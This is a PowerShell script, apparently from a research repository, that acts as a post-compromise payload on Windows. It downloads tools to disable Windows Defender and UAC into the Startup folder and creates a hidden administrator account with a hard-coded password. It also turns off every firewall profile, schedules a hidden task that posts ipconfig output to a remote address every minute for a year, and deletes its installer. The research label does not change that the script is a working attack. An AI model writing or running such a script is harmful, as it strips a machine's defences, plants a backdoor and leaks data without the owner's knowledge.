# Make a directory with random name under temp directory for obfuscation
function New-RandomTempDirectory {
    param(
        [int]$Length = 16
    )

    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

    $randomName = -join (1..$Length | ForEach-Object {
        $chars[(Get-Random -Maximum $chars.Length)]
    })

    $tempPath = [System.IO.Path]::GetTempPath()
    $fullPath = Join-Path $tempPath $randomName

    New-Item -ItemType Directory -Path $fullPath -Force | Out-Null

    return $fullPath
}


$dirPath = New-RandomTempDirectory
# Write-Host "Created directory: $dirPath"

# Download windows disabler
$startupPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
$url = "https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/disableWinDef.ps1"
$outFile = Join-Path $startupPath "disableWinDef.ps1"
Invoke-WebRequest -Uri $url -OutFile $outFile

# Download windows defender and uac remover
$startupPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
$url = "https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/defender_remover13.exe"
$outFile = Join-Path $startupPath "defender_remover.exe"
Invoke-WebRequest -Uri $url -OutFile $outFile

# Create Admin account for persistence
# Run PowerShell as Administrator
$username = "Adm1nistrator"
$password = "Pa$$w0rd"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force

# Create local user
New-LocalUser `
    -Name $username `
    -Password $securePassword `
    -FullName $username `
    -Description "Local admin account" `
    -PasswordNeverExpires `
    -AccountNeverExpires

# Add user to Administrators group
Add-LocalGroupMember -Group "Administrators" -Member $username

# Hide user from login screen
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"

# Create registry path if it does not exist
if (-not (Test-Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}

# Set user to hidden (0 = hidden, 1 = visible)
New-ItemProperty `
    -Path $regPath `
    -Name $username `
    -PropertyType DWORD `
    -Value 0 `
    -Force | Out-Null

# disable firewalls
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Make a sender file under the random temp folder
$filePath = Join-Path $dirPath "sender.ps1"

@'
$url = "http://192.168.0.1:8080"

$output = ipconfig /all | Out-String

Invoke-WebRequest `
    -Uri $url `
    -Method POST `
    -Body $output `
    -ContentType "text/plain"
'@ | Set-Content -Path $filePath -Encoding UTF8

# Create task schedule for sender.ps1
$taskName   = "RunSenderPS1"

$action = New-ScheduledTaskAction `
    -Execute "powershell.exe" `
    -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$filePath`""

$trigger = New-ScheduledTaskTrigger `
    -Once `
    -At (Get-Date) `
    -RepetitionInterval (New-TimeSpan -Minutes 1) `
    -RepetitionDuration (New-TimeSpan -Days 365)

Register-ScheduledTask `
    -TaskName $taskName `
    -Action $action `
    -Trigger $trigger `
    -RunLevel Highest `
    -Force


# # Install OpenSSH Server if not installed
# $sshServer = Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH.Server*'

# if ($sshServer.State -ne "Installed") {
#     Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
# } 

# # Set SSH service to start automatically
# Set-Service -Name sshd -StartupType Automatic

# # Start SSH service
# Start-Service sshd

# # Enable firewall rule
# if (-not (Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue)) {
#     New-NetFirewallRule `
#         -Name "OpenSSH-Server-In-TCP" `
#         -DisplayName "OpenSSH Server (SSH)" `
#         -Enabled True `
#         -Direction Inbound `
#         -Protocol TCP `
#         -Action Allow `
#         -LocalPort 22
# } else {
#     Enable-NetFirewallRule -Name "OpenSSH-Server-In-TCP"
# }


    
Remove-Item installer.ps1